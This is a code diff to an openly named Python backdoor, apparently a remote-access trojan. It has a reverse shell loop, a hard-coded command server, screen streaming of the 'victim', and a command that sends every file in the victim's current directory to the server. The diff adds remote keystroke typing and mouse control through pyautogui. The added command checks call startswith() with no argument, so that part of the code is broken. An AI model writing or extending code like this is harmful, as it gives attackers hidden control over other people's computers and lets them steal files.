@@ -8,6 +8,7 @@ import websocket
 import json
 import geocoder
 import gps  
+import pyautogui
 import io
 import shlex
 from PIL import ImageGrab
@@ -17,6 +18,7 @@ import sounddevice as sd
 import sys
 import webbrowser
 import numpy
+import re
 import mss
 SERVER_URL = "192.168.88.17:2020"
 WEBSOCKET_URL="ws://192.168.88.17:8765"
@@ -60,6 +62,20 @@ banner = r"""
  -open-browser link: Open browser to specifc link.
  -send-all: send all files for current directory from victim's device to the server.
 """
+def write_keyboards(command, delay=0.05):
+    if command.startswith('write "') and command.endswith('"'):
+        text = command[7:-1]
+        pyautogui.write(text, interval=delay)
+def move_mouse(command, duration=0.1):
+    parts = command.split()
+    if parts[0] != "move":
+        return
+    for coord in parts[1:]:
+        try:
+            x, y = map(int, coord.split(","))
+            pyautogui.moveTo(x, y, duration=duration)
+        except ValueError:
+            print(f"Invalid coordinate: {coord}")
 async def watch_victim_screen():
     async with websockets.connect(WEBSOCKET_SCREEN) as ws:
         with mss.MSS() as sct:
@@ -297,6 +313,12 @@ def reverse_shell_payload():
            s.send(b"~shell@backdoor ")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
+               continue
+           if cmd.lower().startswith() == "write":
+               write_keyboards(cmd)
+               continue
+           if cmd.lower().startswith() == "move":
+               move_mouse(cmd)
                continue
            if cmd.lower() == "stream-screen":
                threading.Thread(target=start_watching_victim_screen,daemon=True).start()
